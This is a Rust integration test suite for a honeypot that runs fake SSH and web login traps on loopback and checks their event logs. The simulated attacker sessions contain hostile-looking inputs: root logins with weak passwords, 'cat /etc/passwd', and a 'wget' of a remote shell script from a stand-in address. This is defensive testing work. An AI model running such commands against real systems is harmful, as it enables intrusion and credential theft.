//! End to end tests: a real session against the real traps, on an ephemeral loopback port.

use honeypot::log::EventLog;
use honeypot::trap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

fn temp_log(name: &str) -> PathBuf {
    let path = std::env::temp_dir().join(name);
    let _ = std::fs::remove_file(&path);
    path
}

fn read_until(stream: &mut TcpStream, buffer: &mut String, marker: &str) -> String {
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    loop {
        if let Some(index) = buffer.find(marker) {
            let text: String = buffer.drain(..index + marker.len()).collect();
            return text;
        }
        if std::time::Instant::now() > deadline {
            panic!("no apareció la marca {marker} a tiempo");
        }
        let mut chunk = [0u8; 1024];
        match stream.read(&mut chunk) {
            Ok(0) => panic!("la conexión se cerró antes de {marker}"),
            Ok(count) => buffer.push_str(&String::from_utf8_lossy(&chunk[..count])),
            Err(error) => panic!("fallo de lectura esperando {marker}: {error}"),
        }
    }
}

#[test]
fn ssh_trap_records_the_whole_session() {
    let log_path = temp_log("honeypot-it-ssh.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_ssh_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa SSH");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .unwrap();
    let mut buffer = String::new();

    let banner = read_until(&mut stream, &mut buffer, "\n");
    assert!(
        banner.contains("SSH-2.0-OpenSSH"),
        "banner inesperado: {banner}"
    );

    // Two denied attempts and one accepted: the trap lets the attacker in to observe it.
    for password in ["123456", "admin"] {
        read_until(&mut stream, &mut buffer, "login: ");
        stream.write_all(b"root\n").unwrap();
        read_until(&mut stream, &mut buffer, "Password: ");
        stream
            .write_all(format!("{password}\n").as_bytes())
            .unwrap();
        let denial = read_until(&mut stream, &mut buffer, "Permission denied");
        assert!(denial.contains("Permission denied"), "respuesta: {denial}");
    }

    read_until(&mut stream, &mut buffer, "login: ");
    stream.write_all(b"root\n").unwrap();
    read_until(&mut stream, &mut buffer, "Password: ");
    stream.write_all(b"toor\n").unwrap();
    let welcome = read_until(&mut stream, &mut buffer, "root@victima:~# ");
    assert!(welcome.contains("Welcome"), "respuesta: {welcome}");

    stream.write_all(b"uname -a\n").unwrap();
    let answer = read_until(&mut stream, &mut buffer, "root@victima:~# ");
    assert!(answer.contains("Linux victima"), "respuesta: {answer}");

    stream
        .write_all(b"wget http://198.51.100.7/x.sh\n")
        .unwrap();
    read_until(&mut stream, &mut buffer, "root@victima:~# ");

    stream.write_all(b"exit\n").unwrap();
    let mut rest = String::new();
    let _ = stream.read_to_string(&mut rest);

    // Give the trap a moment to write the closing event.
    std::thread::sleep(Duration::from_millis(200));

    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(content.contains("\"event\":\"connect\""));
    assert!(content.contains("\"event\":\"login_attempt\""));
    assert!(content.contains("\"result\":\"denied\""));
    assert!(content.contains("\"result\":\"accepted\""));
    assert!(content.contains("\"event\":\"login_accepted\""));
    assert!(content.contains("\"event\":\"command\""));
    assert!(content.contains("\"command\":\"uname -a\""));
    assert!(content.contains("\"event\":\"download_attempt\""));
    assert!(content.contains("\"event\":\"session_end\""));

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn http_trap_records_the_credentials_it_receives() {
    let log_path = temp_log("honeypot-it-http.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut page = String::new();
    stream.read_to_string(&mut page).unwrap();
    assert!(page.starts_with("HTTP/1.1 200 OK"), "respuesta: {page}");
    assert!(page.contains("<form"), "falta el formulario: {page}");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    let body = "user=admin&password=clave-de-prueba";
    stream
        .write_all(
            format!(
                "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            )
            .as_bytes(),
        )
        .unwrap();
    let mut answer = String::new();
    stream.read_to_string(&mut answer).unwrap();
    assert!(answer.contains("Sesión iniciada"), "respuesta: {answer}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(content.contains("\"event\":\"http_get\""));
    assert!(content.contains("\"event\":\"http_post\""));
    assert!(content.contains("\"user\":\"admin\""));
    assert!(content.contains("\"password\":\"clave-de-prueba\""));

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn the_scripted_attack_pairs_every_command_with_its_answer() {
    let log_path = temp_log("honeypot-it-attack.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_ssh_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa SSH");

    let outcome = honeypot::attack::run(
        &address.to_string(),
        &["123456", "admin", "toor"],
        Duration::from_secs(5),
    )
    .expect("el ataque simulado falló");

    assert_eq!(outcome.attempts.len(), 3);
    assert!(outcome.attempts[0].response.contains("Permission denied"));
    assert!(outcome.attempts[1].response.contains("Permission denied"));
    assert!(outcome.attempts[2].response.contains("Welcome"));

    let answer_of = |command: &str| {
        outcome
            .commands
            .iter()
            .find(|(sent, _)| sent == command)
            .map(|(_, response)| response.clone())
            .unwrap_or_else(|| panic!("falta la orden {command}"))
    };
    assert!(answer_of("uname -a").contains("Linux victima"));
    assert!(answer_of("whoami").contains("root"));
    assert!(answer_of("id").contains("uid=0(root)"));
    assert!(answer_of("cat /etc/passwd").contains("root:x:0:0"));

    // The transcript shows the answers, not the shell prompt of the fake host.
    for (_, response) in &outcome.commands {
        assert!(
            !response.contains("root@victima"),
            "la respuesta todavía trae el prompt: {response}"
        );
    }

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn unknown_path_is_answered_and_logged() {
    let log_path = temp_log("honeypot-it-404.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /admin HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut answer = String::new();
    stream.read_to_string(&mut answer).unwrap();
    assert!(answer.starts_with("HTTP/1.1 404"), "respuesta: {answer}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(content.contains("\"status\":\"404\""));

    let _ = std::fs::remove_file(&log_path);
}

/// Casos del tope de intentos: (intentos permitidos, pares de credenciales que se
/// envían). El atacante siempre entra igual; cambia cuántas veces se equivoca antes
/// de que la trampa lo cierre.
const CASOS_LIMITE: [(usize, usize); 2] = [(1, 2), (2, 3)];

#[test]
fn el_tope_de_intentos_se_cumple_en_varios_casos() {
    for (max_intentos, pares) in CASOS_LIMITE {
        let log_path = temp_log(&format!("honeypot-it-limite-{max_intentos}.jsonl"));
        let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
        let address = listener.local_addr().expect("no se pudo leer la dirección");

        std::thread::spawn(move || {
            let (stream, _) = listener.accept().expect("no se pudo aceptar");
            honeypot::trap::serve_ssh_session_con_limites(
                stream,
                &log,
                "s-limite",
                max_intentos,
                Duration::from_secs(1),
            );
        });

        let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
        stream
            .set_read_timeout(Some(Duration::from_secs(5)))
            .unwrap();
        let mut buffer = String::new();
        // Se mandan un par más de los permitidos: el último lo rebasa.
        for numero in 0..pares {
            read_until(&mut stream, &mut buffer, "login: ");
            stream.write_all(b"root\n").unwrap();
            read_until(&mut stream, &mut buffer, "Password: ");
            let password = format!("clave-{numero}\n");
            stream.write_all(password.as_bytes()).unwrap();
        }

        let mut resto = String::new();
        let _ = stream.read_to_string(&mut resto);

        std::thread::sleep(Duration::from_millis(200));
        let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
        assert!(
            content.contains("\"event\":\"limite_intentos\""),
            "debía anotarse el tope de intentos con {max_intentos}: {content}"
        );
        assert!(
            resto.contains("Too many authentication failures"),
            "la sesión tenía que cerrarse con {max_intentos} intentos: {resto}"
        );

        let _ = std::fs::remove_file(&log_path);
    }
}

/// Casos del tiempo agotado: (segundos de silencio, cuánto espera la prueba).
const CASOS_TIEMPO: [(u64, u64); 2] = [(1, 1500), (2, 2600)];

#[test]
fn la_sesion_se_cierra_sola_si_el_atacante_se_queda_callado() {
    for (segundos, espera) in CASOS_TIEMPO {
        let log_path = temp_log(&format!("honeypot-it-timeout-{segundos}.jsonl"));
        let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
        let address = listener.local_addr().expect("no se pudo leer la dirección");

        std::thread::spawn(move || {
            let (stream, _) = listener.accept().expect("no se pudo aceptar");
            honeypot::trap::serve_ssh_session_con_limites(
                stream,
                &log,
                "s-timeout",
                2,
                Duration::from_secs(segundos),
            );
        });

        let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
        let mut buffer = String::new();
        read_until(&mut stream, &mut buffer, "SSH-2.0");
        // No se envía nada: el atacante se queda callado.

        std::thread::sleep(Duration::from_millis(espera));
        let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
        assert!(
            content.contains("\"event\":\"sesion_timeout\""),
            "debía anotarse el tiempo agotado con {segundos} s: {content}"
        );

        let _ = std::fs::remove_file(&log_path);
    }
}

#[test]
fn los_clics_en_la_web_falsa_quedan_registrados() {
    let log_path = temp_log("honeypot-it-clicks.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    // Primero se entra con las credenciales.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    let cuerpo = "user=admin&password=clave";
    stream
        .write_all(
            format!(
                "POST /login HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{cuerpo}",
                cuerpo.len()
            )
            .as_bytes(),
        )
        .unwrap();
    let mut pagina = String::new();
    stream.read_to_string(&mut pagina).unwrap();
    assert!(
        pagina.contains("/cuenta"),
        "el panel debe ofrecer enlaces: {pagina}"
    );

    // Después el atacante "hace clic" en una de esas páginas.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /transferencia HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut clic = String::new();
    stream.read_to_string(&mut clic).unwrap();
    assert!(clic.starts_with("HTTP/1.1 200"), "respuesta: {clic}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"http_click\""),
        "faltó el clic: {content}"
    );
    assert!(content.contains("\"path\":\"/transferencia\""));

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn una_linea_demasiado_larga_cierra_la_sesion() {
    let log_path = temp_log("honeypot-it-linea.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
    let address = listener.local_addr().expect("no se pudo leer la dirección");

    std::thread::spawn(move || {
        let (stream, _) = listener.accept().expect("no se pudo aceptar");
        honeypot::trap::serve_ssh_session_con_limites(
            stream,
            &log,
            "s-linea",
            10,
            Duration::from_secs(5),
        );
    });

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .unwrap();
    let mut buffer = String::new();
    read_until(&mut stream, &mut buffer, "login: ");
    // 10 000 bytes sin salto de línea: la trampa no puede guardarlos todos.
    stream.write_all(&vec![b'A'; 10_000]).unwrap();

    let mut resto = String::new();
    let _ = stream.read_to_string(&mut resto);

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"linea_demasiada_larga\""),
        "debía anotarse la línea demasiado larga: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn la_sesion_termina_por_plazo_absoluto_aunque_el_atacante_no_calle() {
    let log_path = temp_log("honeypot-it-plazo.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("no se pudo escuchar");
    let address = listener.local_addr().expect("no se pudo leer la dirección");

    std::thread::spawn(move || {
        let (stream, _) = listener.accept().expect("no se pudo aceptar");
        // Un segundo de plazo: el cliente nunca se queda callado, así que solo el
        // tope absoluto puede cerrar la sesión.
        honeypot::trap::serve_ssh_session_con_limites(
            stream,
            &log,
            "s-plazo",
            10,
            Duration::from_secs(1),
        );
    });

    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .unwrap();
    let mut buffer = String::new();
    read_until(&mut stream, &mut buffer, "login: ");

    // El atacante gotea: un byte cada 100 ms, para que el reloj de inactividad
    // nunca se dispare.
    let mut escritor = stream.try_clone().expect("no se pudo duplicar la conexión");
    let goteo = std::thread::spawn(move || {
        for _ in 0..30 {
            std::thread::sleep(Duration::from_millis(100));
            if escritor.write_all(b"x").is_err() {
                break;
            }
        }
    });

    let mut resto = String::new();
    let _ = stream.read_to_string(&mut resto);
    goteo.join().ok();

    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"sesion_timeout\""),
        "debía anotarse el fin de sesión por plazo: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}

#[test]
fn la_query_string_no_cambia_la_ruta() {
    let log_path = temp_log("honeypot-it-query.jsonl");
    let log = Arc::new(EventLog::open(&log_path).expect("no se pudo abrir el registro"));
    let address = trap::start_http_trap("127.0.0.1:0".parse().unwrap(), Arc::clone(&log))
        .expect("no se pudo abrir la trampa web");

    // La raíz con query string es la página de login, no un 404.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /?foo=bar HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut page = String::new();
    stream.read_to_string(&mut page).unwrap();
    assert!(page.starts_with("HTTP/1.1 200 OK"), "respuesta: {page}");
    assert!(page.contains("<form"), "falta el formulario: {page}");

    // Y el panel con query string también, además de quedar registrado el clic.
    let mut stream = TcpStream::connect(address).expect("no se pudo conectar");
    stream
        .write_all(b"GET /panel?x=1 HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        .unwrap();
    let mut page = String::new();
    stream.read_to_string(&mut page).unwrap();
    assert!(page.starts_with("HTTP/1.1 200 OK"), "respuesta: {page}");

    std::thread::sleep(Duration::from_millis(200));
    let content = std::fs::read_to_string(&log_path).expect("no se pudo leer el registro");
    assert!(
        content.contains("\"event\":\"http_click\""),
        "debía anotarse el clic en el panel: {content}"
    );
    // En el registro se guarda la ruta completa, con la query string.
    assert!(
        content.contains("\"path\":\"/panel?x=1\""),
        "la ruta original debe quedar en el registro: {content}"
    );

    let _ = std::fs::remove_file(&log_path);
}
